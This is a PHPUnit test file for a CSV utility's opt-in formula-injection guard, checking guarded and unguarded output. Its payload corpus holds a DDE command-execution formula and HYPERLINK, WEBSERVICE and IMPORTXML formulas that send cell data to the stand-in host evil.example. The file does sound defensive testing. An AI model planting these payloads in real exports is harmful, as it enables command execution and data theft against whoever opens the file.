<?php

declare(strict_types=1);

namespace D4np\Utils\Tests\Support;

use D4np\Utils\Support\Csv;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Group;
use PHPUnit\Framework\TestCase;

/**
 * T-08's formula-injection corpus — spec r3 §6, RFC-0002; ADR-0037.
 *
 * **Both flag states are asserted**, which is the point of the suite rather than an
 * afterthought: default-off means an unguarded export is a documented, tested behaviour, not
 * an oversight, and a reviewer can see exactly what the opt-in changes. The guard alters the
 * data — the apostrophe is part of the field on any later read — and that cost is asserted
 * too, because it is the reason the default is off (spec §1's input-mutilation rule).
 */
#[Group('T-08')]
final class CsvFormulaGuardTest extends TestCase
{
    private string $dir;

    protected function setUp(): void
    {
        $this->dir = sys_get_temp_dir() . '/egl-utils-csvguard-' . bin2hex(random_bytes(8));
        if (!mkdir($this->dir) && !is_dir($this->dir)) {
            self::fail('could not create the test directory');
        }
    }

    protected function tearDown(): void
    {
        foreach (glob($this->dir . '/*') ?: [] as $entry) {
            @unlink($entry);
        }
        @rmdir($this->dir);
    }

    private function path(): string
    {
        return $this->dir . '/out.csv';
    }

    /**
     * The OWASP CSV-Injection leading characters, plus payloads seen in the wild.
     *
     * @return iterable<string, array{string}>
     */
    public static function formulaPayloads(): iterable
    {
        yield 'equals' => ['=1+1'];
        yield 'plus' => ['+1+1'];
        yield 'minus' => ['-1+1'];
        yield 'at sign' => ['@SUM(A1:A9)'];
        yield 'tab then equals' => ["\t=1+1"];
        yield 'carriage return then equals' => ["\r=1+1"];
        yield 'DDE command execution' => ['=cmd|\' /C calc\'!A0'];
        yield 'hyperlink exfiltration' => ['=HYPERLINK("http://evil.example/?d="&A1,"click")'];
        yield 'webservice exfiltration' => ['=WEBSERVICE("http://evil.example/")'];
        yield 'import xml' => ['=IMPORTXML("http://evil.example/","//x")'];
    }

    #[DataProvider('formulaPayloads')]
    public function testUnguardedIsTheDefaultAndPreservesThePayloadExactly(string $payload): void
    {
        Csv::write($this->path(), [[$payload]]);

        // Default off: the value is exported unchanged. Asserted, not assumed — a default
        // that silently rewrote data would be the magic_quotes mistake (spec §1).
        self::assertSame([[$payload]], iterator_to_array(Csv::read($this->path())));
    }

    #[DataProvider('formulaPayloads')]
    public function testGuardedPrefixesTheFieldSoASpreadsheetTreatsItAsText(string $payload): void
    {
        Csv::write($this->path(), [[$payload]], guardFormulas: true);

        $rows = iterator_to_array(Csv::read($this->path()));

        self::assertSame([["'" . $payload]], $rows);
        self::assertStringStartsWith("'", $rows[0][0]);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function benignValues(): iterable
    {
        yield 'plain word' => ['total'];
        yield 'number' => ['42'];
        yield 'negative number is NOT benign' => ['-42'];
        yield 'equals inside, not leading' => ['a=b'];
        yield 'plus inside, not leading' => ['1+1'];
        yield 'empty' => [''];
    }

    #[DataProvider('benignValues')]
    public function testTheGuardOnlyTouchesALeadingFormulaCharacter(string $value): void
    {
        Csv::write($this->path(), [[$value]], guardFormulas: true);

        $rows = iterator_to_array(Csv::read($this->path()));
        $expected = $value !== '' && in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)
            ? "'" . $value
            : $value;

        self::assertSame([[$expected]], $rows);
    }

    public function testAGuardedFileNoLongerRoundTripsWhichIsTheCostOfTheOptIn(): void
    {
        // The honest consequence, asserted rather than buried in a docblock: turning the
        // guard on means the file is no longer equal to what was exported.
        Csv::write($this->path(), [['=1+1']], guardFormulas: true);

        self::assertNotSame([['=1+1']], iterator_to_array(Csv::read($this->path())));
    }

    public function testTheGuardAppliesToTheHeaderRowToo(): void
    {
        Csv::write($this->path(), [['=evil', 'ok'], ['1', '2']], guardFormulas: true);

        self::assertSame(
            [["'=evil", 'ok'], ['1', '2']],
            iterator_to_array(Csv::read($this->path())),
        );
    }

    public function testANonStringFieldIsLeftAloneByTheGuard(): void
    {
        // A negative int is not a formula-injection vector: it never reaches a cell as text
        // the caller controls. Guarding it would corrupt legitimate numeric exports.
        Csv::write($this->path(), [[-42, 7]], guardFormulas: true);

        self::assertSame([['-42', '7']], iterator_to_array(Csv::read($this->path())));
    }
}
